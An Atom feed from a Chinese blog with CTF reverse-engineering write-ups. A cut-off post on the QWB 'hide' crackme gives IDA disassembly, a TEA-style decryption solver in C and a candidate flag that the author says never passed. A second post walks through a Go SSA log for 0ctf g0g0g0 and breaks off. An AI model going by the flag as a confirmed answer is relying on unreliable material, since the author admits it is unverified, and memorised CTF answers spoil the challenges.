class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">cmp     eax, <span class="number">0</span></span><br><span class="line">hide:<span class="number">00000000004</span>C8EB6 jnz     locret_4C8FDB</span><br><span class="line">hide:<span class="number">00000000004</span>C8EBC xor     rdi, rdi</span><br><span class="line">hide:<span class="number">00000000004</span>C8EBF inc     rdi</span><br><span class="line">hide:<span class="number">00000000004</span>C8EC2 mov     rsi, offset aEnterTheFlag       ; <span class="string">"Enter the flag:\n"</span></span><br><span class="line">hide:<span class="number">00000000004</span>C8EC9 mov     rdx, <span class="number">10</span>h</span><br><span class="line">hide:<span class="number">00000000004</span>C8ED0 xor     eax, eax</span><br><span class="line">hide:<span class="number">00000000004</span>C8ED2 inc     eax</span><br><span class="line">hide:<span class="number">00000000004</span>C8ED4 syscall                                 ; LINUX - sys_write</span><br><span class="line">hide:<span class="number">00000000004</span>C8ED6 xor     rdi, rdi</span><br><span class="line">hide:<span class="number">00000000004</span>C8ED9 xor     eax, eax</span><br><span class="line">hide:<span class="number">00000000004</span>C8EDB mov     rsi, offset unk_6CCDB0</span><br><span class="line">hide:<span class="number">00000000004</span>C8EE2 mov     rdx, <span class="number">20</span>h</span><br><span class="line">hide:<span class="number">00000000004</span>C8EE9 syscall                                 ; LINUX - sys_read</span><br><span class="line">hide:<span class="number">00000000004</span>C8EEB cmp     eax, <span class="number">0</span></span><br><span class="line">hide:<span class="number">00000000004</span>C8EEE jle     loc_4C8FA9</span><br><span class="line">hide:<span class="number">00000000004</span>C8EF4 mov     rdi, offset unk_6CCDB0</span><br><span class="line">hide:<span class="number">00000000004</span>C8EFB mov     rcx, <span class="number">0F</span>FFFFFFFFFFFFFFFh</span><br><span class="line">hide:<span class="number">00000000004</span>C8F02 xor     eax, eax</span><br><span class="line">hide:<span class="number">00000000004</span>C8F04 repne scasb</span><br><span class="line">hide:<span class="number">00000000004</span>C8F06 <span class="keyword">not</span>     rcx</span><br><span class="line">hide:<span class="number">00000000004</span>C8F09 sub     rcx, <span class="number">1</span></span><br><span class="line">hide:<span class="number">00000000004</span>C8F0D cmp     rcx, <span class="number">15</span>h</span><br><span class="line">hide:<span class="number">00000000004</span>C8F11 jnz     loc_4C8FA9</span><br><span class="line">hide:<span class="number">00000000004</span>C8F17 mov     rdi, offset unk_6CCDB0</span><br><span class="line">hide:<span class="number">00000000004</span>C8F1E cmp     byte ptr [rdi+<span class="number">1</span>], <span class="number">77</span>h</span><br><span class="line">hide:<span class="number">00000000004</span>C8F22 jnz     loc_4C8FA9</span><br><span class="line">hide:<span class="number">00000000004</span>C8F28 cmp     byte ptr [rdi+<span class="number">2</span>], <span class="number">62</span>h</span><br><span class="line">hide:<span class="number">00000000004</span>C8F2C jnz     <span class="keyword">short</span> loc_4C8FA9</span><br><span class="line">hide:<span class="number">00000000004</span>C8F2E cmp     byte ptr [rdi+<span class="number">3</span>], <span class="number">7B</span>h</span><br><span class="line">hide:<span class="number">00000000004</span>C8F32 jnz     <span class="keyword">short</span> loc_4C8FA9</span><br><span class="line">hide:<span class="number">00000000004</span>C8F34 cmp     byte ptr [rdi+<span class="number">14</span>h], <span class="number">7</span>Dh</span><br><span class="line">hide:<span class="number">00000000004</span>C8F38 jnz     <span class="keyword">short</span> loc_4C8FA9</span><br><span class="line">hide:<span class="number">00000000004</span>C8F3A mov     rdi, offset unk_6CCDB4</span><br><span class="line">hide:<span class="number">00000000004</span>C8F41 call    near ptr unk_4C8CC0</span><br><span class="line">hide:<span class="number">00000000004</span>C8F46 mov     rdi, offset unk_6CCDB4</span><br><span class="line">hide:<span class="number">00000000004</span>C8F4D call    near ptr unk_4C8E50</span><br><span class="line">hide:<span class="number">00000000004</span>C8F52 mov     rdi, offset unk_6CCDB4</span><br><span class="line">hide:<span class="number">00000000004</span>C8F59 call    near ptr unk_4C8CC0</span><br><span class="line">hide:<span class="number">00000000004</span>C8F5E mov     rdi, offset unk_6CCDB4</span><br><span class="line">hide:<span class="number">00000000004</span>C8F65 call    near ptr unk_4C8E50</span><br><span class="line">hide:<span class="number">00000000004</span>C8F6A mov     rdi, offset unk_6CCDB4</span><br><span class="line">hide:<span class="number">00000000004</span>C8F71 call    near ptr unk_4C8CC0</span><br><span class="line">hide:<span class="number">00000000004</span>C8F76 mov     rdi, offset unk_6CCDB4</span><br><span class="line">hide:<span class="number">00000000004</span>C8F7D call    near ptr unk_4C8E50</span><br><span class="line">hide:<span class="number">00000000004</span>C8F82 mov     rsi, offset unk_4C8CB0</span><br><span class="line">hide:<span class="number">00000000004</span>C8F89 mov     rdx, <span class="number">0</span></span><br><span class="line">hide:<span class="number">00000000004</span>C8F90</span><br><span class="line">hide:<span class="number">00000000004</span>C8F90 loc_4C8F90:                             ; CODE XREF: hide:<span class="number">00000000004</span>C8FA7↓j</span><br><span class="line">hide:<span class="number">00000000004</span>C8F90 cmp     rdx, <span class="number">10</span>h</span><br><span class="line">hide:<span class="number">00000000004</span>C8F94 jnb     <span class="keyword">short</span> loc_4C8FB2</span><br><span class="line">hide:<span class="number">00000000004</span>C8F96 mov     al, [rdi]</span><br><span class="line">hide:<span class="number">00000000004</span>C8F98 mov     ah, [rsi]</span><br><span class="line">hide:<span class="number">00000000004</span>C8F9A cmp     al, ah</span><br><span class="line">hide:<span class="number">00000000004</span>C8F9C jnz     <span class="keyword">short</span> loc_4C8FA9</span><br><span class="line">hide:<span class="number">00000000004</span>C8F9E inc     rdx</span><br><span class="line">hide:<span class="number">00000000004</span>C8FA1 inc     rdi</span><br><span class="line">hide:<span class="number">00000000004</span>C8FA4 inc     rsi</span><br><span class="line">hide:<span class="number">00000000004</span>C8FA7 jmp     <span class="keyword">short</span> loc_4C8F90</span><br><span class="line">hide:<span class="number">00000000004</span>C8FA9 ; ---------------------------------------------------------------------------</span><br><span class="line">hide:<span class="number">00000000004</span>C8FA9</span><br><span class="line">hide:<span class="number">00000000004</span>C8FA9 loc_4C8FA9:                             ; CODE XREF: hide:<span class="number">00000000004</span>C8EEE↑j</span><br><span class="line">hide:<span class="number">00000000004</span>C8FA9                                         ; hide:<span class="number">00000000004</span>C8F11↑j ...</span><br><span class="line">hide:<span class="number">00000000004</span>C8FA9 mov     rsi, offset aYouAreWrong        ; <span class="string">"You are wrong\n"</span></span><br><span class="line">hide:<span class="number">00000000004</span>C8FB0 jmp     <span class="keyword">short</span> loc_4C8FB9</span><br><span class="line">hide:<span class="number">00000000004</span>C8FB2 ; ---------------------------------------------------------------------------</span><br><span class="line">hide:<span class="number">00000000004</span>C8FB2</span><br><span class="line">hide:<span class="number">00000000004</span>C8FB2 loc_4C8FB2:                             ; CODE XREF: hide:<span class="number">00000000004</span>C8F94↑j</span><br><span class="line">hide:<span class="number">00000000004</span>C8FB2 mov     rsi, offset aYouAreRight        ; <span class="string">"You are right\n"</span></span><br><span class="line">hide:<span class="number">00000000004</span>C8FB9</span><br><span class="line">hide:<span class="number">00000000004</span>C8FB9 loc_4C8FB9:                             ; CODE XREF: hide:<span class="number">00000000004</span>C8FB0↑j</span><br><span class="line">hide:<span class="number">00000000004</span>C8FB9 mov     rdi, <span class="number">1</span></span><br><span class="line">hide:<span class="number">00000000004</span>C8FC0 mov     rdx, <span class="number">0</span>Eh</span><br><span class="line">hide:<span class="number">00000000004</span>C8FC7 xor     eax, eax</span><br><span class="line">hide:<span class="number">00000000004</span>C8FC9 inc     eax</span><br><span class="line">hide:<span class="number">00000000004</span>C8FCB syscall                                 ; LINUX - sys_write</span><br><span class="line">hide:<span class="number">00000000004</span>C8FCD mov     rdi, <span class="number">0</span></span><br><span class="line">hide:<span class="number">00000000004</span>C8FD4 mov     eax, <span class="number">3</span>Ch</span><br><span class="line">hide:<span class="number">00000000004</span>C8FD9 syscall                                 ; LINUX - sys_exit</span><br></pre></td></tr></table></figure></p><p>这里面有一点不知道为什么，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hide:00000000004C8F0D cmp     rcx, 15h</span><br></pre></td></tr></table></figure></p><p>这一点就是过不去，因为你输入flag换行会自动加0x0a到flag后面，就导致这几句话永远不能为真，额。。。题目链接挂了，我也没证实。<br>逆一下unk_4C8CC0，unk_4C8E50函数，得出结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QWB&#123;f1Nd_TH3HldeC0dE&#125;</span><br></pre></td></tr></table></figure></p><p>哎，感觉很正确的好不好- – -就是过不去</p><p>最后是solve代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ConsoleApplication1.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdlib.h"</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> result[<span class="number">4</span>] = &#123;<span class="number">0x7f13b852</span>,<span class="number">0x1bf28c35</span>,<span class="number">0xd28663f4</span>,<span class="number">0x311e4f73</span>&#125;;</span><br><span class="line"></span><br><span class="line">__int64 __<span class="function">fastcall <span class="title">rev1</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__int64 result = <span class="number">0</span>; <span class="comment">// rax</span></span><br><span class="line"><span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rt1</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">__int64 v4; <span class="comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+24h] [rbp-3Ch]</span></span><br><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> v8; <span class="comment">// [rsp+44h] [rbp-1Ch]</span></span><br><span class="line"><span class="keyword">int</span> v9; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line"><span class="keyword">int</span> v10; <span class="comment">// [rsp+4Ch] [rbp-14h]</span></span><br><span class="line"><span class="keyword">unsigned</span> __int64 v11; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> v7[<span class="number">4</span>] = &#123;<span class="number">0x70493173</span>, <span class="number">0x45723350</span>, <span class="number">0x79523376</span>, <span class="number">0x33593464</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">v3 = *(_DWORD *)(<span class="number">8</span> * i + a1);</span><br><span class="line">v4 = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(a1 + <span class="number">4</span> + <span class="number">8</span> * i);</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line">HIDWORD(v4) += <span class="number">1735289196</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line">LODWORD(v4) -= ((*(&amp;v7[<span class="number">0</span>] + ((HIDWORD(v4) &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)) + HIDWORD(v4)) ^ (((v3 &gt;&gt; <span class="number">5</span>) ^ <span class="number">16</span> * v3) + v3));</span><br><span class="line">HIDWORD(v4) -= <span class="number">1735289196</span>;</span><br><span class="line">v3 -= (*(&amp;v7[<span class="number">0</span>] + (BYTE4(v4) &amp; <span class="number">3</span>)) + HIDWORD(v4)) ^ ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>)v4 &gt;&gt; <span class="number">5</span>) ^ <span class="number">16</span> * v4) + v4);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">*(_DWORD *)(a1 + <span class="number">8</span> * i) = v3;</span><br><span class="line">*(_DWORD *)(a1 + <span class="number">4</span> + <span class="number">8</span> * i) = v4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">_BYTE *__<span class="function">fastcall <span class="title">rev2</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">_BYTE *result=<span class="number">0</span>; <span class="comment">// rax</span></span><br><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">result = (_BYTE *)(i + a1);</span><br><span class="line">*result ^= i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">rev2((__int64)result);</span><br><span class="line">rev1((__int64)result);</span><br><span class="line">rev2((__int64)result);</span><br><span class="line">rev1((__int64)result);</span><br><span class="line">rev2((__int64)result);</span><br><span class="line">rev1((__int64)result);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"the result is %s"</span>, result);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>[hide题目链接]<a href="https://pan.baidu.com/s/1q3ey9Kz8ObG5ClL6w75tgA" target="_blank" rel="noopener">https://pan.baidu.com/s/1q3ey9Kz8ObG5ClL6w75tgA</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h3&gt;&lt;p&gt;这个题目其实，，，我最后没有得出确切的结论，因为比赛已经结束了，没有机会验证。&lt;br&gt;这个题一看，很容易得出是个linux下的upx程序，脱
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>0ctf的g0g0g0解析</title>
    <link href="https://foyjog.github.io/2018/04/03/0ctf%E7%9A%84g0g0g0%E8%A7%A3%E6%9E%90/"/>
    <id>https://foyjog.github.io/2018/04/03/0ctf的g0g0g0解析/</id>
    <published>2018-04-03T08:45:31.000Z</published>
    <updated>2018-07-03T08:17:30.617Z</updated>
    
    <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>题目给的是一个log文件，打开查看，发现是go语言编写的，所以才叫g0g0g0…</p><h3 id="思路流程"><a href="#思路流程" class="headerlink" title="思路流程"></a>思路流程</h3><p>要看懂log文件不是很难，需要认真一点查看，可以发现这写log文件其实是执行的流程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Entering main.init.</span><br><span class="line">.0:</span><br><span class="line"> t0 = *init$guard</span><br><span class="line"> if t0 goto 2 else 1</span><br><span class="line">.1:</span><br></pre></td></tr></table></figure></p><p>看的出现首先进入main.init,往后查找，发现在15585行leaving main.init<br>所以说很多代码是冗余的，根本不需要看，把init这种，println，scanf这种代码全部删掉，只留下功能性的func函数进行分析即可。<br>精简代码如下：<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">Entering main.main at /tmp/gogo.<span class="keyword">go</span>:<span class="number">172</span>:<span class="number">6.</span></span><br><span class="line"><span class="number">.0</span>:</span><br><span class="line"> t0 = <span class="built_in">new</span> <span class="keyword">string</span> (sa)</span><br><span class="line"> t1 = <span class="built_in">new</span> <span class="keyword">string</span> (sb)</span><br><span class="line"> t2 = <span class="built_in">new</span> <span class="keyword">string</span> (sc)</span><br><span class="line"> t3 = <span class="built_in">new</span> [<span class="number">1</span>]<span class="keyword">interface</span>&#123;&#125; (varargs)</span><br><span class="line"> t4 = &amp;t3[<span class="number">0</span>:<span class="keyword">int</span>]</span><br><span class="line"> t5 = <span class="built_in">make</span> <span class="keyword">interface</span>&#123;&#125; &lt;- <span class="keyword">string</span> (<span class="string">"Input 3 numbers"</span>:<span class="keyword">string</span>)</span><br><span class="line"> *t4 = t5</span><br><span class="line"> t6 = slice t3[:]</span><br><span class="line"> t7 = fmt.Println(t6...)</span><br><span class="line"> t8 = <span class="built_in">new</span> [<span class="number">1</span>]<span class="keyword">interface</span>&#123;&#125; (varargs)</span><br><span class="line"> t9 = &amp;t8[<span class="number">0</span>:<span class="keyword">int</span>]</span><br><span class="line"> t10 = <span class="built_in">make</span> <span class="keyword">interface</span>&#123;&#125; &lt;- *<span class="keyword">string</span> (t0)</span><br><span class="line"> *t9 = t10</span><br><span class="line"> t11 = slice t8[:]</span><br><span class="line"> t12 = fmt.Scanf(<span class="string">"%s"</span>:<span class="keyword">string</span>, t11...)</span><br><span class="line"> t13 = <span class="built_in">new</span> [<span class="number">1</span>]<span class="keyword">interface</span>&#123;&#125; (varargs)</span><br><span class="line"> t14 = &amp;t13[<span class="number">0</span>:<span class="keyword">int</span>]</span><br><span class="line"> t15 = <span class="built_in">make</span> <span class="keyword">interface</span>&#123;&#125; &lt;- *<span class="keyword">string</span> (t1)</span><br><span class="line"> *t14 = t15</span><br><span class="line"> t16 = slice t13[:]</span><br><span class="line"> t17 = fmt.Scanf(<span class="string">"%s"</span>:<span class="keyword">string</span>, t16...)</span><br><span class="line"> t18 = <span class="built_in">new</span> [<span class="number">1</span>]<span class="keyword">interface</span>&#123;&#125; (varargs)</span><br><span class="line"> t19 = &amp;t18[<span class="number">0</span>:<span class="keyword">int</span>]</span><br><span class="line"> t20 = <span class="built_in">make</span> <span class="keyword">interface</span>&#123;&#125; &lt;- *<span class="keyword">string</span> (t2)</span><br><span class="line"> *t19 = t20</span><br><span class="line"> t21 = slice t18[:]</span><br><span class="line"> t22 = fmt.Scanf(<span class="string">"%s"</span>:<span class="keyword">string</span>, t21...)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> t23 = *t0</span><br><span class="line"> t24 = func6(t23)####translate str to <span class="keyword">int</span> arr</span><br><span class="line"> t25 = *t1</span><br><span class="line"> t26 = func6(t25)</span><br><span class="line"> t27 = *t2</span><br><span class="line"> t28 = func6(t27)</span><br><span class="line"></span><br><span class="line"> <span class="comment">//数组长度判断都不是0</span></span><br><span class="line"> t29 = <span class="built_in">len</span>(t24)</span><br><span class="line"> t30 = t29 == <span class="number">0</span>:<span class="keyword">int</span></span><br><span class="line"> <span class="keyword">if</span> t30 <span class="keyword">goto</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">4</span></span><br><span class="line"><span class="number">.4</span>:</span><br><span class="line"> t43 = <span class="built_in">len</span>(t26)</span><br><span class="line"> t44 = t43 == <span class="number">0</span>:<span class="keyword">int</span></span><br><span class="line"> <span class="keyword">if</span> t44 <span class="keyword">goto</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">3</span></span><br><span class="line"><span class="number">.3</span>:</span><br><span class="line"> t41 = <span class="built_in">len</span>(t28)</span><br><span class="line"> t42 = t41 == <span class="number">0</span>:<span class="keyword">int</span></span><br><span class="line"> <span class="keyword">if</span> t42 <span class="keyword">goto</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">2</span></span><br><span class="line"><span class="number">.2</span>:</span><br><span class="line"> t36 = <span class="built_in">new</span> [<span class="number">1</span>]<span class="keyword">int</span> (slicelit)</span><br><span class="line"> t37 = &amp;t36[<span class="number">0</span>:<span class="keyword">int</span>]</span><br><span class="line"> *t37 = <span class="number">0</span>:<span class="keyword">int</span></span><br><span class="line"> t38 = slice t36[:]</span><br><span class="line"> t39 = func1(t24, t38)</span><br><span class="line"></span><br><span class="line"> t40 = t39 &lt;= <span class="number">0</span>:<span class="keyword">int</span></span><br><span class="line"> <span class="keyword">if</span> t40 <span class="keyword">goto</span> <span class="number">5</span> <span class="keyword">else</span> <span class="number">8</span></span><br><span class="line"><span class="number">.8</span>:</span><br><span class="line"> t74 = <span class="built_in">new</span> [<span class="number">1</span>]<span class="keyword">int</span> (slicelit)</span><br><span class="line"> t75 = &amp;t74[<span class="number">0</span>:<span class="keyword">int</span>]</span><br><span class="line"> *t75 = <span class="number">0</span>:<span class="keyword">int</span></span><br><span class="line"> t76 = slice t74[:]</span><br><span class="line"> t77 = func1(t26, t76)</span><br><span class="line"></span><br><span class="line"> t78 = t77 &lt;= <span class="number">0</span>:<span class="keyword">int</span></span><br><span class="line"> <span class="keyword">if</span> t78 <span class="keyword">goto</span> <span class="number">5</span> <span class="keyword">else</span> <span class="number">7</span></span><br><span class="line"><span class="number">.7</span>:</span><br><span class="line"> t69 = <span class="built_in">new</span> [<span class="number">1</span>]<span class="keyword">int</span> (slicelit)</span><br><span class="line"> t70 = &amp;t69[<span class="number">0</span>:<span class="keyword">int</span>]</span><br><span class="line"> *t70 = <span class="number">0</span>:<span class="keyword">int</span></span><br><span class="line"> t71 = slice t69[:]</span><br><span class="line"> t72 = func1(t28, t71)</span><br><span class="line"></span><br><span class="line"> t73 = t72 &lt;= <span class="number">0</span>:<span class="keyword">int</span></span><br><span class="line"> <span class="keyword">if</span> t73 <span class="keyword">goto</span> <span class="number">5</span> <span class="keyword">else</span> <span class="number">6</span></span><br><span class="line"><span class="number">.6</span>:</span><br><span class="line"> t50 = func2(t24, t26)####<span class="keyword">for</span> example t24=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>] t26 = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]</span><br><span class="line"> t51 = func2(t24, t28)</span><br><span class="line"> t52 = func2(t26, t28)</span><br><span class="line"> t53 = func4(t50, t51)</span><br><span class="line"> t54 = func4(t53, t24)</span><br><span class="line"> t55 = func4(t50, t52)</span><br><span class="line"> t56 = func4(t55, t26)</span><br><span class="line"> t57 = func4(t51, t52)</span><br><span class="line"> t58 = func4(t57, t28)</span><br><span class="line"> t59 = func2(t56, t58)</span><br><span class="line"> t60 = func2(t54, t59)</span><br><span class="line"> t61 = <span class="built_in">new</span> [<span class="number">1</span>]<span class="keyword">int</span> (slicelit)</span><br><span class="line"> t62 = &amp;t61[<span class="number">0</span>:<span class="keyword">int</span>]</span><br><span class="line"> *t62 = <span class="number">10</span>:<span class="keyword">int</span></span><br><span class="line"> t63 = slice t61[:]</span><br><span class="line"> t64 = func4(t51, t52)</span><br><span class="line"> t65 = func4(t50, t64)</span><br><span class="line"> t66 = func4(t63, t65)</span><br><span class="line"> t67 = func1(t60, t66)</span><br><span class="line"> t68 = t67 == <span class="number">0</span>:<span class="keyword">int</span></span><br><span class="line"> <span class="keyword">if</span> t68 <span class="keyword">goto</span> <span class="number">9</span> <span class="keyword">else</span> <span class="number">11</span></span><br><span class="line"><span class="number">.11</span>:</span><br><span class="line"> t84 = <span class="built_in">new</span> [<span class="number">1</span>]<span class="keyword">interface</span>&#123;&#125; (varargs)</span><br><span class="line"> t85 = &amp;t84[<span class="number">0</span>:<span class="keyword">int</span>]</span><br><span class="line"> t86 = <span class="built_in">make</span> <span class="keyword">interface</span>&#123;&#125; &lt;- <span class="keyword">string</span> (<span class="string">"Wrong! Try again!!"</span>:<span class="keyword">string</span>)</span><br><span class="line"> *t85 = t86</span><br><span class="line"> t87 = slice t84[:]</span><br><span class="line"> t88 = fmt.Println(t87...)</span><br><span class="line"></span><br><span class="line">Leaving main.main.</span><br></pre></td></tr></table></figure></p><p>代码很好看懂，功能也能的出来，最重要的是看懂<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t8 = phi [<span class="number">0</span>: t1, <span class="number">5</span>: t15] ####rst</span><br></pre></td></tr></table></figure></p><p>这中phi的功能，意思为t8 = t1 